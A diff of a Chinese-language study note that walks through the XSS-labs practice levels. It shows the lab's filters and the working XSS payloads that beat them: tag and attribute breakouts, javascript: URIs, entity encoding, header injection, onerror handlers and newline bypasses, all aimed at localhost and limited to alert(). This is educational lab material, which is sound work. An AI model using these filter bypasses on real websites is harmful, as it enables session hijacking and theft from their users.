@@ -1,4 +1,4 @@
-# XSS-labs
+# XSS-labs 学习笔记
 
 参考博客文章如下，十分感谢：
 
@@ -7,7 +7,7 @@
 
 
 
-## 第一关：未对 POST 参数进行任何过滤
+## 第 01 关：未对 POST 参数进行任何过滤
 
 后端源码：
 
@@ -24,7 +24,7 @@ http://localhost/xss-labs/level1.php?name=<script>alert()</script>
 
 
 
-## 第二关：标签闭合 + JS注入
+## 第 02 关：标签闭合 + JS注入
 
 这关如果在输入框中直接注入 `<script>alert()</script>`，会发现（**Deverloper Tool —> Network —> Get Request Item —> Response** 或者**右击查看网页源代码**）：Get 请求所发送的数据被后端转义成 HTML 实体了！但是，通过观察后端源码可知，`htmlspecialchars()` 函数并没有对单引号进行转义，好吧这点尽管在这里利用不上，最后得出一个结论：无法在 <h2> 标签处中进行 XSS 注入
 
@@ -55,7 +55,7 @@ echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.
 
 
 
-## 第三关：标签属性闭合 + 注入事件属性
+## 第 03 关：标签属性闭合 + 注入事件属性
 
 这关和上一关蛮像的，在输入框直接注入 `<script>alert()</script>`，然后右击查看网页源代码，发现不但 <h2> 标签里面的内容被 HTML 实体化了，<input> 标签里 value属性 的内容也被 HTML 实体化了！
 
@@ -98,7 +98,7 @@ echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.
 
 
 
-## 第四关：标签属性闭合 + 注入事件属性
+## 第 04 关：标签属性闭合 + 注入事件属性
 
 在输入框直接注入 `<script>alert()</script>`，然后右击查看网页源代码，发现 <h2> 标签里面的内容被 HTML 实体化了，<input> 标签里 value 属性的内容被过滤掉了`<`及`>`！
 
@@ -136,7 +136,7 @@ echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.
 
 
 
-## ⭐️第五关：href属性 + JS伪协议 
+## ⭐️第 05 关：标签闭合 + href属性 + JS伪协议 
 
 在输入框直接注入 `<script>alert()</script>`，然后右击查看网页源代码，发现 <h2> 标签里面的内容被 HTML 实体化了，<input> 标签里 value 属性的部分内容有被替换过的痕迹，盲猜后端试图通过替换 JS 关键字，来防止 XSS 攻击！
 
@@ -184,7 +184,7 @@ $str3=str_replace("on","o_n",$str2);
 
 
 
-## 第六关：关键字大小写混合绕过
+## 第 06 关：关键字大小写混合绕过
 
 在输入框直接注入 `<script>alert()</script>`，然后右击查看网页源代码，发现 <h2> 标签里面的内容被 HTML 实体化了，<input> 标签里 value 属性的部分内容有被替换过的痕迹，emmmm怎么和第五关一样？？！！
 
@@ -247,7 +247,7 @@ echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.
 
 
 
-## 第七关：仅替换一次关键字
+## 第 07 关：仅替换一次关键字
 
 在输入框直接注入 `<script>alert()</script>`，然后右击查看网页源代码，发现 <h2> 标签里面的内容被 HTML 实体化了，<input> 标签里 value 属性的部分内容有被替换过的痕迹，即关键字 script 被空字符替换掉了！
 
@@ -286,7 +286,7 @@ echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.
 
 
 
-## ⭐️第八关：href 中可使用 HTML 实体
+## ⭐️第 08 关：href 中可使用 HTML 实体
 
 在输入框直接注入 `<script>alert('hi')</script>`，然后右击查看网页源代码，发现输入框 <input> 标签里面的内容被 HTML 实体化了，但是但是但是会发现单引号`'`没有被实体化！（但是依旧无法利用此漏洞来闭合绕过，因为属性 value 的闭合符号为双引号`"`）<a> 标签里 href 属性的内容有被替换过的痕迹！
 
@@ -305,7 +305,7 @@ echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.
 ' onclick='alert()
 ```
 
-注入结果如下，并没有成功！
+注入结果如下，并没有成功！**因为单引号无法闭合双引号！**
 
 ```html
 <input name=keyword  value="' onclick='alert()">
@@ -374,7 +374,7 @@ javascr&#x69;pt:alert()
 
 
 
-## 第九关：href 中可使用 HTML 实体
+## 第 09 关：href 中可使用 HTML 实体
 
 在输入框直接注入 `<script>alert('hi')</script>`，然后右击查看网页源代码，发现输入框 <input> 标签里面的内容被 HTML 实体化了，但是但是但是会发现单引号`'`没有被实体化！（但是依旧无法利用此漏洞来闭合绕过，因为属性 value 的闭合符号为双引号`"`），<a> 标签里 href 属性的内容是后端代码的返回值！
 
@@ -425,7 +425,7 @@ javascr&#x69;pt:alert()//http://
 
 
 
-## 第十关：标签属性闭合 + 注入事件属性
+## 第 10 关：标签属性闭合 + 注入事件属性
 
 发送 Get 请求：`http://localhost/xss-labs/level10.php?keyword=<script>alert('hi')</script>`，然后右击查看网页源代码，发现输入框 <h2> 标签里面的内容被 HTML 实体化了，但是但是但是会发现单引号`'`没有被实体化！（但是这里依旧无法利用此漏洞来进行闭合绕过，因为没有可闭合的点），然后页面源代码中还有 3 个奇奇怪怪的被隐藏的 <input> 标签！
 
@@ -465,7 +465,7 @@ http://localhost/xss-labs/level10.php?t_sort=" onclick="alert()" type="
 
 
 
-## 第十一关：标签属性闭合 + 注入事件属性
+## 第 11 关：标签属性闭合 + 注入事件属性
 
 发送 Get 请求：`http://localhost/xss-labs/level11.php?keyword=<script>alert('hi')</script>`，然后右击查看网页源代码，发现输入框 <h2> 标签里面的内容被 HTML 实体化了，但是但是但是会发现单引号`'`没有被实体化！（但是这里依旧无法利用此漏洞来进行闭合绕过，因为没有可闭合的点），然后页面源代码中还有 4 个奇奇怪怪的被隐藏的 <input> 标签！其中前 3 个和上一关一样，**第 4 个惊奇地发现其 value 值竟然是上一关的 payload！！！**
 
@@ -512,7 +512,7 @@ Referer: " onclick="alert()" type="
 
 
 
-## 第十二关：标签属性闭合 + 注入事件属性
+## 第 12 关：标签属性闭合 + 注入事件属性
 
 发送 Get 请求：`http://localhost/xss-labs/level12.php?keyword=<script>alert('hi')</script>`，然后右击查看网页源代码，发现输入框 <h2> 标签里面的内容被 HTML 实体化了，但是但是但是会发现单引号`'`没有被实体化！（但是这里依旧无法利用此漏洞来进行闭合绕过，因为没有可闭合的点），然后页面源代码中还有 4 个奇奇怪怪的被隐藏的 <input> 标签！其中前 3 个和上关及上上关一样，**第 4 个惊奇地发现其 value 值是 User-Agent ！！！**
 
@@ -545,7 +545,7 @@ User-Agent: " onclick="alert()" type="
 
 
 
-## 第十三关：标签属性闭合 + 注入事件属性
+## 第 13 关：标签属性闭合 + 注入事件属性
 
 发送 Get 请求：`http://localhost/xss-labs/level13.php?keyword=<script>alert('hi')</script>`，然后右击查看网页源代码，发现输入框 <h2> 标签里面的内容被 HTML 实体化了，但是但是但是会发现单引号`'`没有被实体化！（但是这里依旧无法利用此漏洞来进行闭合绕过，因为没有可闭合的点），然后页面源代码中还有 4 个奇奇怪怪的被隐藏的 <input> 标签！其中前 3 个和上面那三关一样，**第 4 个根据 t_cook 提示，其 value 值应该是指 Cookie 值 ！**
 
@@ -578,18 +578,320 @@ Cookie value: " onclick="alert()" type="
 
 
 
-## 第十四关：❌
+## 第 14 关：❌
 
 这关所引用的网站挂了，暂时不做并跳过...
 
 
 
-## 第十五关：
+## ⭐️第 15 关：注入带事件属性的 html 标签
+
+发送 Get 请求：`http://localhost/xss-labs/level15.php?src=<script>alert('hi')</script>`，然后右击查看网页源代码，发现输入框 <span> 标签里面的内容被 HTML 实体化了，但是会发现单引号`'`没有被实体化！（但是这里依旧无法利用此漏洞来进行闭合绕过，因为单引号`'`无法闭合前面的双引号`"`）
+
+```html
+<span class="ng-include:&lt;script&gt;alert('hi')&lt;/script&gt;"></span>
+```
+
+如果你不信，你可以试一下哟，发送以下 Get 请求：
+
+```js
+http://localhost/xss-labs/level15.php?src=' onlick='alert()
+```
+
+右击查看网页源代码，发现并没注入成功（**证实了单引号`'`无法闭合双引号`"`**）：
+
+```html
+<span class="ng-include:' onlick='alert()"></span>
+```
+
+所以说重新回到开头，审视指令 `ng-include`：**其是 AngularJS 框架中的一个指令，用于将外部 HTML 文件或 AngularJS 模板包含到当前页面中的指定位置，这样可以实现页面模板化和重用性，使得页面结构更加清晰和易于维护** .
+
+所以说解题思路就很清晰了，如果我们引用一个存在 XSS 漏洞的 HTML 页面到本关页面中，然后进行 XSS 攻击进而导致弹框，那么我们就可以通关啦！！！Let's do it ：
+
+```js
+// 将同级目录下，包含漏洞的 'level1.php' 页面引入到本关页面中
+http://localhost/xss-labs/level15.php?src='./level1.php'
+```
+
+然后再利用 XSS 攻击被包含到本关页面中的 level1.php：
+
+```html
+http://localhost/xss-labs/level15.php?src='./level1.php?name=<script>alert()</script>'
+```
+
+发现并没有注入成功！源代码如下所示，这是因为：**`ng-include`的特点是如果引入的是 HTML 文件，则不会执行其中的 <script> 标签内的代码！**
+
+```html
+<span class="ng-include:'./level1.php?name=&lt;script&gt;alert()&lt;/script&gt;'"></span>
+```
+
+那么我们采用新的注入策略，即注入带有事件属性的 html 标签：
+
+**`<img src=1 onerror=alert()>` 解释说明**：当浏览器尝试加载图像失败时（因为`src=1`不是一个有效的图像来源），它会触发`onerror`事件。如果浏览器没有适当的 XSS 防护措施，攻击者可以利用这个事件来执行 JavaScript 代码，比如弹出一个警告框（`alert()`），或者更严重的是，窃取用户的 cookies、执行恶意脚本或者重定向到恶意网站！
+
+```js
+http://localhost/xss-labs/level15.php?src='./level1.php?name=<img src=1 onerror=alert()>'
+```
+
+发现注入成功！右击查看网页源代码，如下所示：
+
+```html
+<span class="ng-include:'./level1.php?name=&lt;img src=1 onerror=alert()&gt;'"></span>
+```
+
+再举个例子，我们也可以这样注入：
+
+```js
+http://localhost/xss-labs/level15.php?src='./level1.php?name=<span onclick="alert()">H1</span>'
+<span class="ng-include:'./level1.php?name=&lt;span onclick=&quot;alert()&quot;&gt;H1&lt;/span&gt;'"></span>
+```
 
 
 
-## 第十六关：
+## 第 16 关：注入带事件属性的 html 标签
+
+发送 Get 请求：`http://localhost/xss-labs/level16.php?keyword=<script>alert('hi')</script>`，然后右击查看网页源代码，发现 <center> 标签里面的内容被有被替换过的痕迹，如 `script`、`/` 均被替换成了 `&nbsp;`！
+
+```html
+<center><&nbsp;>alert('hi')<&nbsp;&nbsp;></center>
+```
+
+闭合绕过操作这里是不太可能了，来试下注入带有事件属性的 html 标签吧：
+
+```js
+http://localhost/xss-labs/level16.php?keyword=<img src=1 onerror=alert()>
+```
+
+发现注入失败！源码如下所示，又发现一个规律：即**`空格`也会被替换成 `&nbsp;`**！
+
+```html
+<center><img&nbsp;src=1&nbsp;onerror=alert()></center>
+```
+
+这导致之前所有的 payload 都失效了！怎么办呢？
+
+答案：**HTML 中可使用换行符（`%0A`）来代替空格**！Ok，那么我们使用换行符（`%0A`）重新注入一下：
+
+```html
+http://localhost/xss-labs/level16.php?keyword=<img%0Asrc=1%0Aonerror=alert()>
+```
+
+发现注入成功！网页源码如下所示：
+
+```html
+<center><img
+src=1
+onerror=alert()></center><center>
+```
+
+再举个例子，我们也可以这样注入：
+
+```html
+http://localhost/xss-labs/level16.php?keyword=<span%0Aonclick="alert()">ClickIt</span>
+<center><span
+onclick="alert()">ClickIt<&nbsp;span></center>
+```
 
 
 
-2024 / 1 / 9 / 23: 12
+## 第 17 ~ 20 关：❌
+
+Level 17 到 Level 20 都是 Flash 的利用，现在 Flash 已经退出历史舞台了，所以这几关已经失去意义！
+
+
+
+## 解题思路简洁总结：
+
+### 第 01 关：文本解析为 HTML
+
+解题思路：直接注入 JS
+
+```html
+http://localhost/xss-labs/level1.php?name=<script>alert()</script>
+```
+
+
+
+### 第 02 关：input 标签 value 注入
+
+解题思路：闭合 input 标签 + 注入JS
+
+```js
+// 符号 "> 用于闭合 input 标签，即构成 <input name=keyword  value="">
+"><script>alert()</script>
+```
+
+
+
+### 第 03 关：htmlspecialchars() 的弱点
+
+解题思路：value 标签属性闭合 + 注入事件属性
+
+```js
+// 第 1 个单引号用于与 value 属性的第一个单引号构成闭合, 即构成 value=''
+// 第 2 个单引号用于与 value 属性的第二个单引号构成闭合, 即构成 onclick='alert()'
+' onclick='alert()
+```
+
+
+
+### 第 04 关：没有过滤双引号
+
+解题思路：value 标签属性闭合 + 注入事件属性
+
+```js
+// 第 1 个双引号用于与 value 属性的第一个双引号构成闭合, 即构成 value=""
+// 第 2 个双引号用于与 value 属性的第二个双引号构成闭合, 即构成 onclick="alert()"
+" onclick="alert()
+```
+
+
+
+### 第 05 关：href 的危险
+
+解题思路：标签闭合 + href属性 + JS伪协议 
+
+```js
+// 符号 "> 用于闭合 input 标签, 即构成 <input name="keyword" value="">
+"> <a href=javascript:alert()>hack it</a>
+```
+
+
+
+### 第 06 关：很蠢的字符过滤，大小写混合绕过
+
+解题思路1：标签闭合 + JS注入，这里的 payload 同第二关，只不过把 script 改成了大写而已：
+
+```js
+// 符号 "> 用于闭合 input 标签，即构成 <input name=keyword  value="">
+"><SCRIPT>alert()</SCRIPT>
+```
+
+解题思路2：标签属性闭合 + 注入事件属性，这里的 payload 同第四关，只不过把 onclick 改成了大写而已：
+
+```js
+// 第 1 个双引号用于与 value 属性的第一个双引号构成闭合, 即构成 value=""
+// 第 2 个双引号用于与 value 属性的第二个双引号构成闭合, 即构成 onclick="alert()"
+" ONCLICK="alert()
+```
+
+解题思路3：利用 href 属性 + JS 伪协议，这里的 payload 同第五关，只不过把 href 改成大写而已：
+
+```js
+// 符号 "> 用于闭合 input 标签, 即构成 <input name="keyword" value="">
+"> <a HREF=javascript:alert()>hack it</a>
+```
+
+
+
+### 第 07 关：字符串替换，但只做一次
+
+解题思路：标签属性闭合 + JS注入
+
+```js
+// 符号 "> 用于闭合 input 标签, 即构成 <input name="keyword" value="">
+// script被替换后，SCR 及 IPT 将构成新的 SCRIPT
+"> <SCRscriptIPT>alert()</SCRscriptIPT>
+```
+
+
+
+### 第 08 关：URI 中的实体
+
+解题思路：在 `href` 使用 HTML 实体
+
+```html
+javascr&#x69;pt:alert()
+```
+
+
+
+### 第 09 关：单纯的「必须包含」
+
+解题思路：在 `href` 使用 HTML 实体
+
+```js
+// 通过 JS 注释符号 // 来 `http://` 注释掉，防止其影响到前面 JS 的执行
+javascr&#x69;pt:alert()//http://
+```
+
+
+
+### 第 10 关：隐藏表单字段注入
+
+解题思路：标签属性闭合 + 注入事件属性
+
+```js
+// 第 1 个双引号用于闭合 value 属性的第一个双引号，即构成 value=""
+// 最后 1 个双引号用于闭合 value 属性的最后一个双引号，即构成 type=""，进而令后面的 type="hidden" 失效，使 input 输入框显示在页面中，为最后点击输入框导致弹窗做准备！
+http://localhost/xss-labs/level10.php?t_sort=" onclick="alert()" type="
+```
+
+
+
+### 第 11 关：Referer 注入
+
+解题思路：修改 Referer（标签属性闭合 + 注入事件属性）
+
+```js
+// 修改前的结果：
+Referer: http://localhost/xss-labs/level10.php?t_sort=%22%20onclick=%22alert()%22%20type=%22
+// 修改后的结果：
+// 第 1 个双引号用于闭合 value 属性的第一个双引号，即构成 value=""
+// 最后 1 个双引号用于闭合 value 属性的最后一个双引号，即构成 type=""，进而令后面的 type="hidden" 失效，使 input 输入框显示在页面中，为最后点击输入框导致弹窗做准备！
+Referer: " onclick="alert()" type="
+```
+
+
+
+### 第 12 关：UA 注入
+
+解题思路：修改 User-Agent（标签属性闭合 + 注入事件属性）
+
+```js
+// 修改前的结果：
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
+// 修改后的结果：
+// 第 1 个双引号用于闭合 value 属性的第一个双引号，即构成 value=""
+// 最后 1 个双引号用于闭合 value 属性的最后一个双引号，即构成 type=""，进而令后面的 type="hidden" 失效，使 input 输入框显示在页面中，为最后点击输入框导致弹窗做准备！
+User-Agent: " onclick="alert()" type="
+```
+
+
+
+### 第 13 关：Cookie 注入
+
+解题思路：修改 Cookie（标签属性闭合 + 注入事件属性）
+
+```js
+// 修改前：
+Cookie value: call+me+maybe%3F
+// 修改后：
+// 第 1 个双引号用于闭合 value 属性的第一个双引号，即构成 value=""
+// 最后 1 个双引号用于闭合 value 属性的最后一个双引号，即构成 type=""，进而令后面的 type="hidden" 失效，使 input 输入框显示在页面中，为最后点击输入框导致弹窗做准备！
+Cookie value: " onclick="alert()" type="
+```
+
+
+
+### 第 15 关：Angular `ng-include`
+
+解题思路：利用 `ng-include` 的特性 + 注入带事件属性的 html 标签
+
+```js
+http://localhost/xss-labs/level15.php?src='./level1.php?name=<img src=1 onerror=alert()>'
+// or
+http://localhost/xss-labs/level15.php?src='./level1.php?name=<span onclick="alert()">H1</span>'
+```
+
+
+
+### 第 16 关：空格过滤
+
+解题思路：利用换行符 `%0A` 代替空格 + 注入带事件属性的 html 标签
+
+```js
+http://localhost/xss-labs/level16.php?keyword=<img%0Asrc=1%0Aonerror=alert()>
+// or
+http://localhost/xss-labs/level16.php?keyword=<span%0Aonclick="alert()">ClickIt</span>
+```
